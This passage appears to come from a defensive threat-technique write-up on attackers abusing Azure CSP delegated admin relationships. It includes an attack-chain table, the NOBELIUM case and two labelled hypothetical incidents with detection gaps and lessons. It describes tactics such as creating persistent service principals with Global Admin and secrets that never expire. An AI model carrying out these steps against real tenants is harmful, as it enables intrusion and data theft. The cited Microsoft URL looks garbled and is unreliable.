| **2** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker sprays passwords against CSP tenant |
| **3** | **Privilege Escalation** | **[PE-VALID-014]** | **Attacker uses compromised CSP account to escalate via DAP/GDAP** |
| **4** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker creates persistent service principal in customer tenant |
| **5** | **Lateral Movement** | [LM-AUTH-021] Azure Lighthouse Cross-Tenant | Attacker uses backdoor to access other customer tenants |
| **6** | **Collection** | [COLLECTION-012] Mailbox Export via Delegated Access | Attacker exports customer email data |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: NOBELIUM Supply Chain Attack (Microsoft DART, October 2021)

- **APT Group:** NOBELIUM (Russian state-sponsored)
- **Timeline:** Ongoing 2019-2021; DART incident published October 2021
- **Attack Vector:** Compromised multiple CSP/managed service provider accounts; used DAP relationships to access customer tenants
- **Technique:** Abused Admin-On-Behalf-Of (AOBO) tokens combined with Azure RunCommand to move from cloud to on-premises
- **Impact:** Access to hundreds of downstream customers; data exfiltration; persistence establishment
- **Key Quote:** "NOBELIUM leverages established standard business practices to target downstream customers across multiple managed tenants. These delegated administrative privileges are often neither audited for approved use nor disabled by a service provider."
- **Reference:** [Microsoft Security Blog: NOBELIUM Targeting Delegated Administrative Privileges](https://www.microsoft.com/en-us/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broad-scope-oss-potential-testing-survey/)

### Example 2: Compromised MSP - Multi-Customer Lateral Movement (Hypothetical 2024)

- **Scenario:** Managed Service Provider (MSP) compromised via supply chain attack
- **Vector:** 
  - MSP's update server compromised → malware distributed to MSP staff workstations
  - Credential stealer captured MSP Global Admin credentials
  - Attacker logged in as MSP admin using stolen credentials
- **Exploitation:**
  - Enumerated 200+ customer tenants with active DAP relationships
  - Created service principal with Global Admin in each customer tenant
  - Established persistent access points across all customers
  - Deployed ransomware to 50+ customers simultaneously
- **Detection Gaps:** 
  - MSP had no audit logging for AOBO access
  - Customers had no cross-tenant access restrictions
  - Bulk user creation went unnoticed for 2+ weeks
- **Response:**
  - Microsoft threat intelligence alerted MSP of anomalous activity
  - MSP revoked all DAP relationships (forcing service disruption)
  - Customers required 48-hour incident response
- **Lesson:** DAP relationships create a single point of failure; one compromised CSP = all customers compromised

### Example 3: Insider Threat - Malicious CSP Employee (Hypothetical 2025)

- **Scenario:** Disgruntled CSP employee with Global Admin privileges
- **Attack Chain:**
  1. Employee decided to exfiltrate data from high-value customers before resignation
  2. Used delegated admin access to create service principals in customer tenants
  3. Assigned service principal Global Admin role
  4. Created app secret with no expiration
  5. Left CSP but retained access via service principal
- **Impact:** Ongoing unauthorized access post-employment; data theft; competitive espionage
- **Detection:** Audit logs showed user creation and role assignment during employee's tenure; Service principal usage continued after employee's departure
- **Lesson:** Regular audit of delegated access is critical; track service principal lifecycle

---
